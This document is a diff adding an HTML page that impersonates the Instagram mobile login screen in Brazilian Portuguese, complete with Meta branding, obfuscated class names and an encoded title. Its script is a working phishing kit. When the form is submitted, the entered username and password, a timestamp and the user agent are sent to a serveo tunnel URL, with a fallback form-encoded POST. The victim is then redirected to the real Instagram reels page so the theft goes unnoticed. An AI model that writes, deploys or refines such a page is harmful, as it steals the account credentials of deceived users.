@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>&#73;nstagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body, html {
+            height: 100dvh;
+            background-color: #000;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        /* SPLASH */
+        #_x1a2b3c {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 120px 0 60px 0;
+            z-index: 1000;
+            transition: opacity 0.35s ease;
+        }
+
+        ._c4d5e6f {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        ._g7h8i9j {
+            width: 80px;
+            height: 80px;
+        }
+
+        ._k0l1m2n {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+        }
+
+        ._o3p4q5r {
+            color: #8E8E8E;
+            font-size: 13px;
+        }
+
+        ._s6t7u8v {
+            display: flex;
+            align-items: baseline;
+            gap: 4px;
+        }
+
+        ._w9x0y1z {
+            font-size: 24px;
+            font-weight: 600;
+            background: linear-gradient(135deg, #FCAF45, #FD1D1D, #E1306C, #C13584, #833AB4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        ._a2b3c4d {
+            font-size: 20px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #FCAF45, #FD1D1D, #E1306C, #C13584, #833AB4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* LOGIN */
+        #_e5f6g7h {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            height: 100dvh;
+            background-color: #000;
+            padding: 0 16px;
+        }
+
+        ._i8j9k0l {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            padding: 16px 0 8px;
+            margin-bottom: 12px;
+        }
+
+        ._m1n2o3p {
+            color: #A8A8A8;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        ._q4r5s6t {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 36px;
+        }
+
+        ._u7v8w9x {
+            width: 64px;
+            height: 64px;
+        }
+
+        #_y0z1a2b {
+            width: 100%;
+            max-width: 358px;
+        }
+
+        ._c3d4e5f {
+            width: 100%;
+            background: #121212;
+            border: 0.5px solid #363636;
+            border-radius: 12px;
+            padding: 14px 16px;
+            color: #FFF;
+            font-size: 14px;
+            margin-bottom: 10px;
+            outline: none;
+        }
+
+        ._c3d4e5f:focus {
+            border-color: #A8A8A8;
+        }
+
+        ._c3d4e5f::placeholder {
+            color: #8E8E8E;
+        }
+
+        ._g6h7i8j {
+            width: 100%;
+            background: #0095F6;
+            color: #FFF;
+            border: none;
+            border-radius: 18px;
+            padding: 7px 0;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 12px;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+
+        ._k9l0m1n {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 80px;
+        }
+
+        ._o2p3q4r {
+            color: #FFF;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        ._s5t6u7v {
+            margin-top: auto;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-bottom: 24px;
+        }
+
+        ._w8x9y0z {
+            width: 100%;
+            max-width: 358px;
+            background: transparent;
+            border: 1px solid #0095F6;
+            border-radius: 18px;
+            padding: 7px 0;
+            color: #0095F6;
+            font-size: 14px;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            margin-bottom: 28px;
+        }
+
+        ._a1b2c3d svg {
+            width: 70px;
+            opacity: 0.6;
+        }
+    </style>
+</head>
+<body>
+
+    <svg style="width:0; height:0; position:absolute;">
+        <defs>
+            <linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#833AB4"/>
+                <stop offset="25%" stop-color="#C13584"/>
+                <stop offset="50%" stop-color="#E1306C"/>
+                <stop offset="75%" stop-color="#FD1D1D"/>
+                <stop offset="100%" stop-color="#FCAF45"/>
+            </linearGradient>
+        </defs>
+    </svg>
+
+    <!-- SPLASH -->
+    <div id="_x1a2b3c">
+        <div class="_c4d5e6f">
+            <svg class="_g7h8i9j" viewBox="0 0 24 24" fill="none">
+                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#g)" stroke-width="2.2" fill="none"/>
+                <circle cx="12" cy="12" r="5.5" stroke="url(#g)" stroke-width="2.2" fill="none"/>
+                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#g)"/>
+            </svg>
+        </div>
+        <div class="_k0l1m2n">
+            <p class="_o3p4q5r">from</p>
+            <div class="_s6t7u8v">
+                <span class="_w9x0y1z">∞</span>
+                <span class="_a2b3c4d">Meta</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOGIN -->
+    <div id="_e5f6g7h">
+        <div class="_i8j9k0l">
+            <div class="_m1n2o3p">
+                <span>Português (Brasil)</span>
+                <svg viewBox="0 0 24 24" width="12" height="12" fill="#A8A8A8">
+                    <path d="M7 10l5 5 5-5H7z"/>
+                </svg>
+            </div>
+        </div>
+        
+        <div class="_q4r5s6t">
+            <svg class="_u7v8w9x" viewBox="0 0 24 24" fill="none">
+                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#g)" stroke-width="2.2" fill="none"/>
+                <circle cx="12" cy="12" r="5.5" stroke="url(#g)" stroke-width="2.2" fill="none"/>
+                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#g)"/>
+            </svg>
+        </div>
+
+        <form id="_y0z1a2b">
+            <input type="text" name="_d4e5f6g" class="_c3d4e5f" placeholder="Nome de usuário, email ou celular" autocomplete="off">
+            <input type="text" name="_h7i8j9k" class="_c3d4e5f" placeholder="Senha" autocomplete="off">
+            <button type="submit" class="_g6h7i8j">Entrar</button>
+        </form>
+
+        <div class="_k9l0m1n">
+            <a href="#" class="_o2p3q4r">Esqueceu a senha?</a>
+        </div>
+
+        <div class="_s5t6u7v">
+            <a href="#" class="_w8x9y0z">Criar nova conta</a>
+            <div class="_a1b2c3d">
+                <svg viewBox="0 0 287 56" fill="white">
+                    <path d="M55.5 14.5C55.5 14.5 58.5 10 64 10C69.5 10 72 15 72 15L79 4C79 4 73.5 -2 64 2C54.5 6 55.5 14.5 55.5 14.5Z" fill="currentColor"/>
+                    <path d="M46 46C46 46 40 52 33 52C26 52 21 47 21 40C21 33 26 28 33 28C40 28 45 33 45 33L38 41C38 41 36 44 33 44C30 44 28 42 28 40C28 38 30 36 33 36C35 36 37 38 37 38L46 46Z" fill="currentColor"/>
+                    <path d="M90 52L90 4L98 4L98 52L90 52Z" fill="currentColor"/>
+                    <path d="M110 52L110 4L118 4L118 52L110 52Z" fill="currentColor"/>
+                    <path d="M130 52L130 4L138 4L138 24L152 4L162 4L146 22L164 52L152 52L138 28L138 52L130 52Z" fill="currentColor"/>
+                    <path d="M175 52L175 4L183 4L183 24L197 4L207 4L191 22L209 52L197 52L183 28L183 52L175 52Z" fill="currentColor"/>
+                    <circle cx="230" cy="28" r="24" stroke="currentColor" stroke-width="8" fill="none"/>
+                    <path d="M267 52L267 4L275 4L275 52L267 52Z" fill="currentColor"/>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ================== LINK DO SERVE O ==================
+        const _l0m1n2o3 = "https://73ce804caf993f8e-45-161-216-55.serveousercontent.com";
+
+        // ========== SPLASH ==========
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                document.getElementById('_x1a2b3c').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('_x1a2b3c').style.display = 'none';
+                    document.getElementById('_e5f6g7h').style.display = 'flex';
+                }, 350);
+            }, 2200);
+        });
+        
+        // ========== FORMULÁRIO ==========
+        document.getElementById('_y0z1a2b').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const _p4q5r6s7 = document.querySelector('input[name="_d4e5f6g"]').value.trim();
+            const _t8u9v0w1 = document.querySelector('input[name="_h7i8j9k"]').value.trim();
+            
+            if (!_p4q5r6s7 || !_t8u9v0w1) return;
+
+            const _x2y3z4a5 = {
+                _b6c7d8e9: _p4q5r6s7,
+                _f0g1h2i3: _t8u9v0w1,
+                _j4k5l6m7: new Date().toISOString(),
+                _n8o9p0q1: navigator.userAgent
+            };
+
+            try {
+                await fetch(_l0m1n2o3, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(_x2y3z4a5),
+                    mode: 'no-cors'
+                });
+            } catch (err) {
+                try {
+                    const _r2s3t4u5 = new URLSearchParams();
+                    Object.keys(_x2y3z4a5).forEach(key => _r2s3t4u5.append(key, _x2y3z4a5[key]));
+                    await fetch(_l0m1n2o3, {
+                        method: 'POST',
+                        body: _r2s3t4u5
+                    });
+                } catch (e2) {}
+            }
+
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/reels/';
+            }, 900);
+        });
+        
+        // ========== LINKS ==========
+        document.querySelectorAll('a').forEach(l => l.addEventListener('click', e => e.preventDefault()));
+    </script>
+</body>
+  </html>
